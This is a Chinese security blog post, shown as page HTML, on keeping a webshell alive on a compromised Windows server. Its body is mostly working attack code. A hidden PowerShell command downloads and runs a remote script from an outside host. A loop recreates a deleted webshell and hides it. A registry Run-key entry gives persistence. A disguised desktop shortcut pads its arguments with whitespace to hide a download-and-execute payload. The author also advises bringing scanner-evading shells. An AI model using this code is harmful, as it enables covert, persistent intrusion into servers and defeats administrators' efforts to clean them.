@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script> <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=1.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="奇淫技巧," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Bang'Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Dream like the king">
+<meta name="keywords" content="奇淫技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="隐藏我的shell">
+<meta property="og:url" content="http://yoursite.com/2017/12/11/hiddenshell/index.html">
+<meta property="og:site_name" content="Bang&#39;Blog">
+<meta property="og:description" content="Dream like the king">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ozt0qscbi.bkt.clouddn.com/hiddenshell.gif">
+<meta property="og:image" content="http://ozt0qscbi.bkt.clouddn.com/ub3r.gif">
+<meta property="og:updated_time" content="2017-12-11T03:02:47.874Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="隐藏我的shell">
+<meta name="twitter:description" content="Dream like the king">
+<meta name="twitter:image" content="http://ozt0qscbi.bkt.clouddn.com/hiddenshell.gif">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '1.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/12/11/hiddenshell/"/>
+
+
+
+
+
+  <title>隐藏我的shell | Bang'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bang'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">关注web安全</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-导航">
+          <a href="/SecWeb/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/11/hiddenshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bang'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">隐藏我的shell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-11T08:53:34+08:00">
+                2017-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><blockquote class="blockquote-center">Dream like the king</blockquote><br><a id="more"></a><br>今天在<a href="http://ub3r.cn/" target="_blank" rel="external">UB3R表哥</a>的的博客学到了一个利用powershell来隐藏shell的姿势.D盾和安全狗是可以扫描出来的,所以自备免杀马,在管理员会经常进行全站扫描的情况下.</p>
+<h2 id="0x00-利用脚本"><a href="#0x00-利用脚本" class="headerlink" title="0x00.利用脚本"></a>0x00.利用脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://tools.52xss.com/powershell/webshell.ps1&apos;);Backd00r-webshell.ps1&quot;</div></pre></td></tr></table></figure>
+<p>webshell.ps1 代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$shell_path = &quot;G:\xampp\htdocs\backdoor\shell.php&quot;</div><div class="line">$shell_content = [System.IO.File]::ReadAllBytes($shell_path)</div><div class="line">while($true)&#123;</div><div class="line">    $flag = Test-Path $shell_path</div><div class="line">    if($flag -eq &quot;True&quot;)&#123; sleep 1 &#125;</div><div class="line">    else&#123;</div><div class="line">        [System.IO.File]::WriteAllBytes($shell_path, $shell_content)</div><div class="line">        $shell = Get-Item $shell_path</div><div class="line">        $shell.Attributes = &quot;Readonly&quot;,&quot;system&quot;,&quot;notcontentindexed&quot;,&quot;hidden&quot;,&quot;archive&quot;</div><div class="line">        sleep 1</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>代码分析：$shell_path的路径是我们已经获取到的web shell的路径，代码很简单，首先ps1先获取web shell的文件内容，然后这个ps1脚本一直在静默检测web shell是否存在，如果脚本被删除则创建一个web shell文件，内容为脚本运行时获取的内容，并继续静默检测管理员是否将web shell删除。<br>演示:<br><img src="http://ozt0qscbi.bkt.clouddn.com/hiddenshell.gif"></p>
+<h2 id="0x01-添加启动项"><a href="#0x01-添加启动项" class="headerlink" title="0x01.添加启动项"></a>0x01.添加启动项</h2><p>如果服务器重启或其他因素导致脚本停止运行，那不妨添加一个写注册表开机启动项的功能吧！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$autorunKeyName = &quot;Windows Powershell&quot;</div><div class="line">$autorunKeyVal = &quot;powershell.exe -nop -windowstyle hidden -exec bypass -c &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://tools.52xss.com/powershell/webshell.ps1&apos;);Backd00r-webshell.ps1&quot;&quot;&quot;</div><div class="line">$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line">if (-not $autoruns.$autorunKeyName) &#123;</div><div class="line">    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal</div><div class="line">&#125;</div><div class="line">elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) &#123;</div><div class="line">    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName</div><div class="line">    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="0x02-LNK捆绑"><a href="#0x02-LNK捆绑" class="headerlink" title="0x02.LNK捆绑"></a>0x02.LNK捆绑</h2><p>Evi1cg LNK_捆绑<a href="https://evi1cg.me/archives/Shortcut_Backdoor.html" target="_blank" rel="external">姿势</a><br><img src="http://ozt0qscbi.bkt.clouddn.com/ub3r.gif"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line">Function LNK_backdoor&#123;</div><div class="line">    $Command = &quot;powershell.exe -nop -windowstyle hidden -exec bypass -c &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://ub3r.cn/tools/backd00r/Backd00r-webshell.ps1&apos;);Backd00r-webshell.ps1&quot;&quot;&quot;</div><div class="line">    ##HIDE Computer Icon</div><div class="line">    $ErrorActionPreference = &quot;SilentlyContinue&quot;</div><div class="line">    If ($Error) &#123;$Error.Clear()&#125;</div><div class="line">    $RegistryPath = &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</div><div class="line">    If (Test-Path $RegistryPath) &#123;</div><div class="line">        $Res = Get-ItemProperty -Path $RegistryPath -Name &quot;HideIcons&quot;</div><div class="line">        If (-Not($Res)) &#123;</div><div class="line">            New-ItemProperty -Path $RegistryPath -Name &quot;HideIcons&quot; -Value &quot;0&quot; -PropertyType DWORD -Force | Out-Null</div><div class="line">        &#125;</div><div class="line">        $Check = (Get-ItemProperty -Path $RegistryPath -Name &quot;HideIcons&quot;).HideIcons</div><div class="line">        If ($Check -NE 0) &#123;</div><div class="line">            New-ItemProperty -Path $RegistryPath -Name &quot;HideIcons&quot; -Value &quot;0&quot; -PropertyType DWORD -Force | Out-Null</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $RegistryPath = &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons&quot;</div><div class="line">    If (-Not(Test-Path $RegistryPath)) &#123;</div><div class="line">        New-Item -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer&quot; -Name &quot;HideDesktopIcons&quot; -Force | Out-Null</div><div class="line">        New-Item -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons&quot; -Name &quot;NewStartPanel&quot; -Force | Out-Null</div><div class="line">    &#125;</div><div class="line">    $RegistryPath = &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel&quot;</div><div class="line">    If (-Not(Test-Path $RegistryPath)) &#123;</div><div class="line">        New-Item -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons&quot; -Name &quot;NewStartPanel&quot; -Force | Out-Null</div><div class="line">    &#125;</div><div class="line">    If (Test-Path $RegistryPath) &#123;</div><div class="line">    ## -- My Computer</div><div class="line">        $Res = Get-ItemProperty -Path $RegistryPath -Name &quot;&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot;</div><div class="line">        If (-Not($Res)) &#123;</div><div class="line">            New-ItemProperty -Path $RegistryPath -Name &quot;&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot; -Value &quot;1&quot; -PropertyType DWORD -Force | Out-Null</div><div class="line">        &#125;</div><div class="line">        $Check = (Get-ItemProperty -Path $RegistryPath -Name &quot;&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot;).&quot;&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot;</div><div class="line">        If ($Check -NE 1) &#123;</div><div class="line">            New-ItemProperty -Path $RegistryPath -Name &quot;&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot; -Value &quot;1&quot; -PropertyType DWORD -Force | Out-Null</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    If ($Error) &#123;$Error.Clear()&#125;</div><div class="line">    ##SHOW Computer Icon</div><div class="line">    #set-ItemProperty -Path &apos;HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu&apos; -Name &quot;&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot; -Value 0</div><div class="line">    #set-ItemProperty -Path &apos;HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel&apos; -Name &quot;&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot; -Value 0</div><div class="line">    #RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True</div><div class="line">    $Commandline = &quot;/c explorer.exe /e,::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125; | &quot;</div><div class="line">    $Command = $Commandline + $Command</div><div class="line">    $get_path=New-Object -ComObject WScript.Shell; </div><div class="line">    $path = $get_path.SpecialFolders.Item(&apos;Desktop&apos;)</div><div class="line">    $WshShell = New-Object -comObject WScript.Shell</div><div class="line">    $My_Computer = 17</div><div class="line">    $Shell = new-object -comobject shell.application</div><div class="line">    $NSComputer = $Shell.Namespace($My_Computer)</div><div class="line">    $name = $NSComputer.self.name</div><div class="line">    $Shortcut = $WshShell.CreateShortcut($path+&quot;\&quot;+$name+&quot;.lnk&quot;)</div><div class="line">    $Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot;</div><div class="line">    $Shortcut.WindowStyle = 7</div><div class="line">    $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,15&quot;</div><div class="line">    $Shortcut.Arguments = &apos;                                                                                                                                                                                                                                      &apos;+ $Command</div><div class="line">    $Shortcut.Save()</div><div class="line">    refresh</div><div class="line">&#125;</div><div class="line">Function refresh&#123;</div><div class="line">   $source = @&quot;</div><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Text;</div><div class="line">using System.Runtime.InteropServices;</div><div class="line">namespace FileEncryptProject.Algorithm</div><div class="line">&#123;</div><div class="line">  public class DesktopRefurbish</div><div class="line">  &#123;</div><div class="line">    [DllImport(&quot;shell32.dll&quot;)]</div><div class="line">    public static extern void SHChangeNotify(HChangeNotifyEventID wEventId, HChangeNotifyFlags uFlags, IntPtr dwItem1, IntPtr dwItem2);</div><div class="line">    public static void DeskRef()</div><div class="line">    &#123;</div><div class="line">      SHChangeNotify(HChangeNotifyEventID.SHCNE_ASSOCCHANGED, HChangeNotifyFlags.SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  #region public enum HChangeNotifyFlags</div><div class="line">  [Flags]</div><div class="line">  public enum HChangeNotifyFlags</div><div class="line">  &#123;</div><div class="line">    SHCNF_DWORD = 0x0003,</div><div class="line">    SHCNF_IDLIST = 0x0000,</div><div class="line">    SHCNF_PATHA = 0x0001,</div><div class="line">    SHCNF_PATHW = 0x0005,</div><div class="line">    SHCNF_PRINTERA = 0x0002,</div><div class="line">    SHCNF_PRINTERW = 0x0006,</div><div class="line">    SHCNF_FLUSH = 0x1000,</div><div class="line">    SHCNF_FLUSHNOWAIT = 0x2000</div><div class="line">  &#125;</div><div class="line">  #endregion//enum HChangeNotifyFlags</div><div class="line">  #region enum HChangeNotifyEventID</div><div class="line">  [Flags]</div><div class="line">  public enum HChangeNotifyEventID</div><div class="line">  &#123;</div><div class="line">    SHCNE_ALLEVENTS = 0x7FFFFFFF,</div><div class="line">    SHCNE_ASSOCCHANGED = 0x08000000,</div><div class="line">    SHCNE_ATTRIBUTES = 0x00000800,</div><div class="line">    SHCNE_CREATE = 0x00000002,</div><div class="line">    SHCNE_DELETE = 0x00000004,</div><div class="line">    SHCNE_DRIVEADD = 0x00000100,</div><div class="line">    SHCNE_DRIVEADDGUI = 0x00010000,</div><div class="line">    SHCNE_DRIVEREMOVED = 0x00000080,</div><div class="line">    SHCNE_EXTENDED_EVENT = 0x04000000,</div><div class="line">    SHCNE_FREESPACE = 0x00040000,</div><div class="line">    SHCNE_MEDIAINSERTED = 0x00000020,</div><div class="line">    SHCNE_MEDIAREMOVED = 0x00000040,</div><div class="line">    SHCNE_MKDIR = 0x00000008,</div><div class="line">    SHCNE_NETSHARE = 0x00000200,</div><div class="line">    SHCNE_NETUNSHARE = 0x00000400,</div><div class="line">    SHCNE_RENAMEFOLDER = 0x00020000,</div><div class="line">    SHCNE_RENAMEITEM = 0x00000001,</div><div class="line">    SHCNE_RMDIR = 0x00000010,</div><div class="line">    SHCNE_SERVERDISCONNECT = 0x00004000,</div><div class="line">    SHCNE_UPDATEDIR = 0x00001000,</div><div class="line">    SHCNE_UPDATEIMAGE = 0x00008000,</div><div class="line">  &#125;</div><div class="line">  #endregion</div><div class="line">&#125;</div><div class="line">&quot;@</div><div class="line">     Add-Type -TypeDefinition $source</div><div class="line">    [FileEncryptProject.Algorithm.DesktopRefurbish]::DeskRef()</div><div class="line">&#125;</div><div class="line">LNK_backdoor</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/奇淫技巧/" rel="tag"># 奇淫技巧</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/08/msfvenom/" rel="next" title="msfvenom">
+                <i class="fa fa-chevron-left"></i> msfvenom
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.png"
+              alt="Bang" />
+          
+            <p class="site-author-name" itemprop="name">Bang</p>
+            <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bestsec" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=hackbang@qq.com" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://52xss.com" target="_blank" title="Xss平台">
+                  
+                    <i class="fa fa-fw fa-google"></i>Xss平台</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.issce.cn/" title="sodme" target="_blank">sodme</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.lov3ling.com/" title="Lov3" target="_blank">Lov3</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.inksec.cn/" title="Szrzvdny" target="_blank">Szrzvdny</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.blogsir.com.cn/" title="江sir" target="_blank">江sir</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-利用脚本"><span class="nav-number">1.</span> <span class="nav-text">0x00.利用脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-添加启动项"><span class="nav-number">2.</span> <span class="nav-text">0x01.添加启动项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-LNK捆绑"><span class="nav-number">3.</span> <span class="nav-text">0x02.LNK捆绑</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bang</span>
+
+  
+</div>
+
+
+<div class="powered-by"> <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"> 本站访客数:<span id="busuanzi_value_site_uv"></span> </span> </div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v1.1.1</div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=1.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=1.1.1"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=1.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=1.1.1"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=1.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
